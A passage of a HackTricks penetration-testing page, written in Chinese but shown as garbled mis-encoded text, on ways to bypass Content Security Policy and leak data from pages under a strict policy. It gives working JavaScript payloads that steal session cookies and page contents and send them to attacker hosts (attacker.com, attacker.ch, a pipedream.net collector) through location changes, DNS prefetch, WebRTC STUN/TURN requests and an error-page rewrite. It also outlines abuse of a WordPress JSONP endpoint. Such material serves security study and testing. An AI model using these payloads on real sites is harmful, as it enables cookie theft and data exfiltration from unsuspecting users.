<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘å¯åŠ¨å’Œé‡è¦å¹³å°æ›´æ–°

**åŠ å…¥æˆ‘ä»¬** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ï¼Œä»Šå¤©å°±å¼€å§‹ä¸é¡¶çº§é»‘å®¢åˆä½œï¼

## ç»•è¿‡CSPçš„å±é™©æŠ€æœ¯

### å‚æ•°è¿‡å¤šæ—¶çš„PHPé”™è¯¯

æ ¹æ®[**è¿™ä¸ªè§†é¢‘ä¸­è¯„è®ºçš„æœ€åä¸€ä¸ªæŠ€æœ¯**](https://www.youtube.com/watch?v=Sm4G6cAHjWM)ï¼Œå‘é€è¿‡å¤šå‚æ•°ï¼ˆ1001ä¸ªGETå‚æ•°ï¼Œå°½ç®¡ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨POSTå‚æ•°å’Œè¶…è¿‡20ä¸ªæ–‡ä»¶ï¼‰ã€‚ä»»ä½•åœ¨PHPç½‘é¡µä»£ç ä¸­å®šä¹‰çš„**`header()`**éƒ½**ä¸ä¼šè¢«å‘é€**ï¼Œå› ä¸ºè¿™å°†è§¦å‘é”™è¯¯ã€‚

### PHPå“åº”ç¼“å†²åŒºæº¢å‡º

PHPä»¥é»˜è®¤æ–¹å¼**ç¼“å†²å“åº”åˆ°4096**å­—èŠ‚ã€‚å› æ­¤ï¼Œå¦‚æœPHPæ˜¾ç¤ºè­¦å‘Šï¼Œé€šè¿‡æä¾›**è¶³å¤Ÿçš„æ•°æ®åœ¨è­¦å‘Šä¸­**ï¼Œ**å“åº”**å°†åœ¨**CSPå¤´**ä¹‹å‰**å‘é€**ï¼Œå¯¼è‡´å¤´è¢«å¿½ç•¥ã€‚\
ç„¶åï¼Œè¿™ä¸ªæŠ€æœ¯åŸºæœ¬ä¸Šæ˜¯**ç”¨è­¦å‘Šå¡«å……å“åº”ç¼“å†²åŒº**ï¼Œä»¥ä¾¿CSPå¤´ä¸è¢«å‘é€ã€‚

æ¥è‡ª[**è¿™ä¸ªå†™ä½œ**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points)çš„æƒ³æ³•ã€‚

### é‡å†™é”™è¯¯é¡µé¢

æ ¹æ®[**è¿™ä¸ªå†™ä½œ**](https://blog.ssrf.kr/69)ï¼Œä¼¼ä¹å¯ä»¥é€šè¿‡åŠ è½½ä¸€ä¸ªé”™è¯¯é¡µé¢ï¼ˆå¯èƒ½æ²¡æœ‰CSPï¼‰å¹¶é‡å†™å…¶å†…å®¹æ¥ç»•è¿‡CSPä¿æŠ¤ã€‚
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOMEæ˜¯ä¸€ç§åˆ©ç”¨XSSï¼ˆæˆ–é«˜åº¦é™åˆ¶çš„XSSï¼‰**åœ¨é¡µé¢çš„ä¸€ä¸ªç«¯ç‚¹**ä¸­**æ»¥ç”¨****åŒä¸€æ¥æºçš„å…¶ä»–ç«¯ç‚¹**çš„æŠ€æœ¯ã€‚è¿™æ˜¯é€šè¿‡ä»æ”»å‡»è€…é¡µé¢åŠ è½½æ˜“å—æ”»å‡»çš„ç«¯ç‚¹ï¼Œç„¶åå°†æ”»å‡»è€…é¡µé¢åˆ·æ–°åˆ°æ‚¨æƒ³è¦æ»¥ç”¨çš„åŒä¸€æ¥æºçš„çœŸå®ç«¯ç‚¹æ¥å®ç°çš„ã€‚è¿™æ ·ï¼Œ**æ˜“å—æ”»å‡»çš„ç«¯ç‚¹**å¯ä»¥åœ¨**æœ‰æ•ˆè½½è·**ä¸­ä½¿ç”¨**`opener`**å¯¹è±¡æ¥**è®¿é—®**è¦æ»¥ç”¨çš„**çœŸå®ç«¯ç‚¹çš„DOM**ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

æ­¤å¤–ï¼Œ**wordpress**åœ¨`/wp-json/wp/v2/users/1?_jsonp=data`ä¸­æœ‰ä¸€ä¸ª**JSONP**ç«¯ç‚¹ï¼Œè¯¥ç«¯ç‚¹å°†**åå°„**è¾“å‡ºä¸­å‘é€çš„**æ•°æ®**ï¼ˆä»…é™å­—æ¯ã€æ•°å­—å’Œç‚¹çš„é™åˆ¶ï¼‰ã€‚

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥ç«¯ç‚¹**ç”Ÿæˆé’ˆå¯¹WordPressçš„SOMEæ”»å‡»**å¹¶å°†å…¶åµŒå…¥`<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>`ä¸­ï¼Œè¯·æ³¨æ„è¿™ä¸ª**è„šæœ¬**å°†è¢«**åŠ è½½**ï¼Œå› ä¸ºå®ƒæ˜¯**è¢«'self'å…è®¸çš„**ã€‚æ­¤å¤–ï¼Œç”±äºå®‰è£…äº†WordPressï¼Œæ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡**æ˜“å—æ”»å‡»çš„****å›è°ƒ**ç«¯ç‚¹æ»¥ç”¨**SOMEæ”»å‡»**ï¼Œè¯¥ç«¯ç‚¹**ç»•è¿‡CSP**ä»¥ç»™äºˆç”¨æˆ·æ›´å¤šæƒé™ï¼Œå®‰è£…æ–°æ’ä»¶...\
æœ‰å…³å¦‚ä½•æ‰§è¡Œæ­¤æ”»å‡»çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹[https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration Bypasses

å¦‚æœå­˜åœ¨ä¸¥æ ¼çš„CSPï¼Œä¸å…è®¸æ‚¨**ä¸å¤–éƒ¨æœåŠ¡å™¨äº¤äº’**ï¼Œåˆ™å§‹ç»ˆå¯ä»¥åšä¸€äº›äº‹æƒ…æ¥æå–ä¿¡æ¯ã€‚

### Location

æ‚¨å¯ä»¥ä»…æ›´æ–°ä½ç½®ä»¥å°†ç§˜å¯†ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼š
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta tag

æ‚¨å¯ä»¥é€šè¿‡æ³¨å…¥å…ƒæ ‡ç­¾è¿›è¡Œé‡å®šå‘ï¼ˆè¿™åªæ˜¯é‡å®šå‘ï¼Œä¸ä¼šæ³„éœ²å†…å®¹ï¼‰
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

ä¸ºäº†æ›´å¿«åœ°åŠ è½½é¡µé¢ï¼Œæµè§ˆå™¨å°†é¢„å…ˆè§£æä¸»æœºåä¸ºIPåœ°å€å¹¶å°†å…¶ç¼“å­˜ä»¥ä¾›åç»­ä½¿ç”¨ã€‚\
æ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æŒ‡ç¤ºæµè§ˆå™¨é¢„è§£æä¸»æœºåï¼š`<link rel="dns-prefetch" href="something.com">`

æ‚¨å¯ä»¥åˆ©ç”¨è¿™ç§è¡Œä¸ºæ¥**é€šè¿‡DNSè¯·æ±‚æ³„éœ²æ•æ„Ÿä¿¡æ¯**ï¼š
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
å¦ä¸€ç§æ–¹æ³•ï¼š
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
ä¸ºäº†é¿å…è¿™ç§æƒ…å†µå‘ç”Ÿï¼ŒæœåŠ¡å™¨å¯ä»¥å‘é€HTTPå¤´ï¼š
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
æ˜¾ç„¶ï¼Œè¿™ç§æŠ€æœ¯åœ¨æ— å¤´æµè§ˆå™¨ï¼ˆæœºå™¨äººï¼‰ä¸­ä¸èµ·ä½œç”¨
{% endhint %}

### WebRTC

åœ¨å‡ ä¸ªé¡µé¢ä¸Šä½ å¯ä»¥çœ‹åˆ°**WebRTCä¸æ£€æŸ¥CSPçš„`connect-src`ç­–ç•¥**ã€‚

å®é™…ä¸Šï¼Œä½ å¯ä»¥é€šè¿‡ä¸€ä¸ª_DNSè¯·æ±‚_æ¥_æ³„éœ²_ä¿¡æ¯ã€‚çœ‹çœ‹è¿™æ®µä»£ç ï¼š
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
å¦ä¸€ä¸ªé€‰é¡¹ï¼š
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## æ£€æŸ¥ CSP ç­–ç•¥åœ¨çº¿

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## è‡ªåŠ¨åˆ›å»º CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## å‚è€ƒèµ„æ–™

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

â€‹

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘è®¡åˆ’å’Œé‡è¦å¹³å°æ›´æ–°

**åŠ å…¥æˆ‘ä»¬** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ï¼Œä»Šå¤©å°±å¼€å§‹ä¸é¡¶å°–é»‘å®¢åˆä½œï¼

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
